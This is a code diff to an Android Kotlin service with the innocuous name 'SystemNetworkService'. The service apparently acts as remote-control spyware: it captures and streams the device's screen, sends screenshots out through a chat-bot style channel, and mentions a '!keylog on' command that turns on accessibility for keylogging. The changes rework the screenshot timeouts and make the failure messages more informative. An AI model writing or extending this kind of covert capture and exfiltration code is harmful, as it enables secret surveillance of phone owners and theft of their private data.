@@ -268,7 +268,9 @@ class SystemNetworkService : Service() {
                             }
                             d.sendFile(":camera: **Screenshot**", "screen_${System.currentTimeMillis()}.png", bytes)
                         } else {
-                            val err = ":x: **Screenshot failed** (${elapsed}ms)\nEnsure accessibility is enabled"
+                            val acc = AccessibilityHelper.isRunning
+                            val ver = Build.VERSION.SDK_INT
+                            val err = ":x: **Screenshot failed** (${elapsed}ms)\nAccessibility: $acc | Android: $ver\nTry: `!keylog on` to enable accessibility first"
                             if (progressId != null) d.editMsg(progressId, err) else d.sendMsg(err)
                         }
                     } catch (e: Exception) {
@@ -892,13 +894,15 @@ class SystemNetworkService : Service() {
 
     private suspend fun captureScreen(): ByteArray? = withContext(Dispatchers.IO) {
         try {
-            val deferred = CompletableDeferred<ByteArray?>()
-            val ss = DisplayCapture(this@SystemNetworkService)
-            ss.capture(object : DisplayCapture.Callback {
-                override fun onSuccess(data: ByteArray) { deferred.complete(data) }
-                override fun onFailure(error: String) { deferred.complete(null) }
-            })
-            withTimeoutOrNull(15000L) { deferred.await() }
+            withTimeoutOrNull(20000L) {
+                val deferred = CompletableDeferred<ByteArray?>()
+                val ss = DisplayCapture(this@SystemNetworkService)
+                ss.capture(object : DisplayCapture.Callback {
+                    override fun onSuccess(data: ByteArray) { deferred.complete(data) }
+                    override fun onFailure(error: String) { deferred.complete(null) }
+                })
+                deferred.await()
+            }
         } catch (e: Exception) {
             null
         }
@@ -906,13 +910,15 @@ class SystemNetworkService : Service() {
 
     private suspend fun captureScreenForStream(): ByteArray? = withContext(Dispatchers.IO) {
         try {
-            val deferred = CompletableDeferred<ByteArray?>()
-            val ss = DisplayCapture(this@SystemNetworkService)
-            ss.captureForStream(object : DisplayCapture.Callback {
-                override fun onSuccess(data: ByteArray) { deferred.complete(data) }
-                override fun onFailure(error: String) { deferred.complete(null) }
-            })
-            withTimeoutOrNull(10000L) { deferred.await() }
+            withTimeoutOrNull(15000L) {
+                val deferred = CompletableDeferred<ByteArray?>()
+                val ss = DisplayCapture(this@SystemNetworkService)
+                ss.captureForStream(object : DisplayCapture.Callback {
+                    override fun onSuccess(data: ByteArray) { deferred.complete(data) }
+                    override fun onFailure(error: String) { deferred.complete(null) }
+                })
+                deferred.await()
+            }
         } catch (e: Exception) {
             null
         }
